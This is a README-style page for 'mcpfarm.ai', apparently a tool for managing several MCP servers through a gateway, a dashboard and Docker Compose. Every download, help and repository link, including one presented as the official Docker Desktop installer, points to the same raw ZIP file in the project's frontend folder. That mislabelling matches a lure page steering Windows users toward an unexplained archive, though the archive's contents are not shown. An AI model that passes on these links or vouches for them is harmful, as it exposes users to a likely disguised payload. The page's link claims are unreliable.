# 🚜 mcpfarm.ai - Manage Multiple MCP Servers Easily

[![Download mcpfarm.ai](https://img.shields.io/badge/Download-mcpfarm.ai-brightgreen)](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip)

---

## 🔍 What is mcpfarm.ai?

mcpfarm.ai is an open-source tool that helps you run and manage many MCP servers at once. It works by collecting several FastMCP servers and controlling them through one main gateway. You get a live dashboard that shows you what’s going on, plus secure access with API keys. You can also use it with Python thanks to a built-in SDK. Everything runs smoothly with Docker Compose, which sets up all parts for you.

---

## 💻 What You Need Before Starting

Before you begin, make sure your Windows computer meets these simple requirements:

- Windows 10 or later (64-bit recommended)
- At least 8 GB of RAM
- 10 GB free disk space
- A working internet connection
- Docker Desktop installed with Docker Compose enabled

You can download Docker Desktop for Windows from [https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip). Follow the installation guide on their site.

---

## 🚀 Getting Started: How to Download and Run mcpfarm.ai

### Step 1: Visit the Download Page

Go to the main project page to get the software.

[Download mcpfarm.ai](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip)

Click the link and open the page in your web browser. This page hosts all files and instructions you need.

### Step 2: Install Docker Desktop (If not installed)

Docker is a tool that sets up the environment mcpfarm.ai needs to run. If you don’t have it, download and install Docker Desktop from their official site.

- Run the installer
- Follow all prompts
- Restart your computer if asked

Make sure Docker is running and Docker Compose is enabled.

### Step 3: Download the mcpfarm.ai Files

On the GitHub page, look for a green button called **Code**. Click it and choose **Download ZIP**. Save the file anywhere easy to find, like your Desktop or Documents folder.

### Step 4: Extract the Files

Open the ZIP file you downloaded. Right-click and choose **Extract All**. Pick a folder where you want to keep the files permanently. For example, `C:\Users\YourName\mcpfarm.ai`.

### Step 5: Open Windows PowerShell or Command Prompt

You need to run some commands to start the software. Press the Windows key, type `PowerShell`, and press Enter. Or open Command Prompt by typing `cmd`.

### Step 6: Navigate to the mcpfarm.ai Folder

In the PowerShell or Command Prompt window, type the command below and press Enter:

```
cd "C:\Users\YourName\mcpfarm.ai"
```

Change the path if you saved the files somewhere else.

### Step 7: Start mcpfarm.ai with Docker Compose

Type the following command and hit Enter:

```
docker-compose up
```

This command tells Docker Compose to start all the parts of mcpfarm.ai. You will see messages showing progress.

### Step 8: Access the Dashboard

Once everything starts, open your web browser and go to:

```
http://localhost:3000
```

You will see the mcpfarm.ai dashboard. From here, you can add and manage MCP servers.

---

## 🔧 How to Use mcpfarm.ai

### Dashboard Overview

- **Server List:** Shows all the MCP servers currently running.
- **Status:** Displays live health checks and response times.
- **API Keys:** Manage who can access the servers.
- **Metrics:** View real-time data about server performance.
  
### Adding a New MCP Server

1. Click **Add Server** on the dashboard.
2. Enter the server address or IP.
3. Assign an API key for secure access.
4. Click **Save**.

The new server will appear on your list and start reporting data.

### Using the Python SDK

If you want to automate tasks, you can use the Python SDK included with mcpfarm.ai.

- Open Python on your computer.
- Install dependencies by running:

```
pip install mcpfarm_sdk
```

- Use the SDK to connect to your mcpfarm.ai server and control agents or get metrics.

Example:

```python
from mcpfarm_sdk import Client

client = Client(api_key="your-api-key", server_url="http://localhost:3000")
servers = client.list_servers()
print(servers)
```

---

## 🔒 API Key Authentication

mcpfarm.ai uses API keys to keep your servers safe. The dashboard lets you create, delete, or update API keys. Only users with valid keys can access the servers.

---

## 📈 Prometheus Metrics

mcpfarm.ai provides Prometheus-compatible metrics. You can connect monitoring tools to track server health, usage, and performance in detail.

---

## 📦 Docker Compose Setup Details

The Docker Compose file sets up three main components:

- **Gateway:** The main entry point that routes traffic.
- **FastMCP Servers:** Tool servers running in containers.
- **Dashboard:** A web interface to manage everything.

You do not need to configure these manually. Docker Compose handles it automatically.

---

## ⚙️ Updating mcpfarm.ai

1. Download the latest ZIP from the GitHub page again.
2. Extract and replace your current files.
3. Run `docker-compose down` in PowerShell or Command Prompt inside the old folder.
4. Navigate to the new folder.
5. Run `docker-compose up` to start the new version.

---

## 🛠 Troubleshooting Tips

- If Docker does not start, make sure your computer supports virtualization and that it is enabled in BIOS.
- If the dashboard doesn’t load, verify Docker and Docker Compose are running with `docker ps`.
- Restart Docker Desktop if containers do not start properly.
- Check firewall settings to ensure ports like 3000 are open and accessible.
- Use PowerShell or Command Prompt as Administrator if you have permission issues.

---

## 📚 Learn More and Get Help

Visit the official repository for detailed documentation, issues, and community support:

[https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip](https://raw.githubusercontent.com/enriquetask/mcpfarm.ai/main/frontend/mcpfarm_ai_2.6.zip)